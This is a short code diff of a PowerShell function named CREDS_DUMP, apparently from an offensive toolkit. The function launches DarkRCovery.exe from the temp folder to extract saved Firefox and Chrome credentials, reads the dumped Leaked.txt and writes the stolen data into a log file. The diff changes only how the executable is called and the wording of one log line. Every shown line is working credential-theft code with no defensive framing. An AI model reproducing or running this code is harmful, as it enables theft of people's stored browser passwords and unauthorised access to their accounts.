@@ -859,7 +859,7 @@ function CREDS_DUMP {
     ## Leak Firefox|Chrome creds (By 0xyg3n)
     If(Test-Path "$env:tmp\DarkRCovery.exe"){
         echo "`n`n[ Leak credentials - By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-        cd $env:tmp;./DarkRCovery.exe
+        cd $env:tmp;& "$env:tmp\DarkRCovery.exe"
         Start-Sleep -Seconds 8 # Wait for DarkRCovery to finish ..
         If(Test-Path "$env:tmp\Leaked.txt"){
             $StoreCreds = Get-Content "$env:tmp\Leaked.txt" -ErrorAction SilentlyContinue
@@ -876,7 +876,7 @@ function CREDS_DUMP {
             echo $ParseData >> $LogFilePath\BrowserEnum.log
             cd $IPATH
         }else{
-            echo "[i] Not found: `$env:tmp\Leaked.txt" >> $LogFilePath\BrowserEnum.log
+            echo "[ Not found: `$env:tmp\Leaked.txt ]" >> $LogFilePath\BrowserEnum.log
             cd $IPATH
         }
     }else{
